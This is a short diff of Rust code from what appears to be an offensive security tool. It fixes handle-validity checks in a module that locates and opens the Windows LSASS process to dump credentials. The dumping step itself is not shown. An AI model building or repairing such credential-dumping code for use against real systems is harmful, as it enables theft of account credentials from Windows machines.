@@ -39,7 +39,7 @@ pub fn dump(req: &CredDumpLsass) -> Result<CredentialOutput, KrakenError> {
             lsass_pid,
         );
 
-        if process_handle.is_null() {
+        if process_handle == 0 {
             return Err(KrakenError::Module(
                 "Failed to open LSASS process - check privileges".into(),
             ));
@@ -75,7 +75,7 @@ pub fn dump(req: &CredDumpLsass) -> Result<CredentialOutput, KrakenError> {
 
 #[cfg(windows)]
 fn find_lsass_pid() -> Result<u32, KrakenError> {
-    use windows_sys::Win32::Foundation::CloseHandle;
+    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
     use windows_sys::Win32::System::Diagnostics::ToolHelp::{
         CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
         TH32CS_SNAPPROCESS,
@@ -83,7 +83,7 @@ fn find_lsass_pid() -> Result<u32, KrakenError> {
 
     unsafe {
         let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-        if snapshot.is_null() {
+        if snapshot == INVALID_HANDLE_VALUE {
             return Err(KrakenError::Module("Failed to create process snapshot".into()));
         }
 
